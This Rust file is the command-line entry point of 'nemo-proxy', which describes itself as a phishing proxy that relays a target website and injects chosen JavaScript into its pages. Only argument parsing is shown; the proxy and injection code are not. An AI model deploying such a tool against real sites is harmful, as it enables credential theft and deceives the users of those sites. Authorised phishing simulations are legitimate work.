#![deny(warnings)]

mod server;
mod proxy;

use std::fs;
use clap::{App, Arg};

#[tokio::main]
async fn main() -> Result<(), String> {
    let app = App::new("nemo-proxy")
        .version("0.1")
        .author("zdunekhere@gmail.com")
        .about("Nemo is a pluggable phishing proxy with JavaScript injection written in Rust")
        .arg(
            Arg::with_name("address")
                .help("HTTP server address")
                .short("a")
                .long("address")
                .default_value("127.0.0.1:8000")
                .takes_value(true)
        )
        .arg(
            Arg::with_name("target")
                .help("The website for phishing")
                .required(true)
                .short("t")
                .long("target")
                .takes_value(true)
        )
        .arg(
            Arg::with_name("javascript")
                .help("JavaScript injection")
                .default_value("")
                .short("j")
                .long("inject-js")
                .takes_value(true)
        );

    let matches = app.get_matches();
    let cmd_bind_addr = matches.value_of("address").ok_or_else(|| "address is required")?;
    let cmd_forward_url = matches.value_of("target").ok_or_else(|| "url is required")?;
    let cmd_inject_js = match matches.value_of("javascript") {
        Some(t) => t,
        None => ""
    };

    let js_script = fs::read_to_string(cmd_inject_js)
        .unwrap_or_else(|_| String::from(cmd_inject_js));

    server::Server::run(cmd_bind_addr, cmd_forward_url, &js_script).await;

    Ok(())
}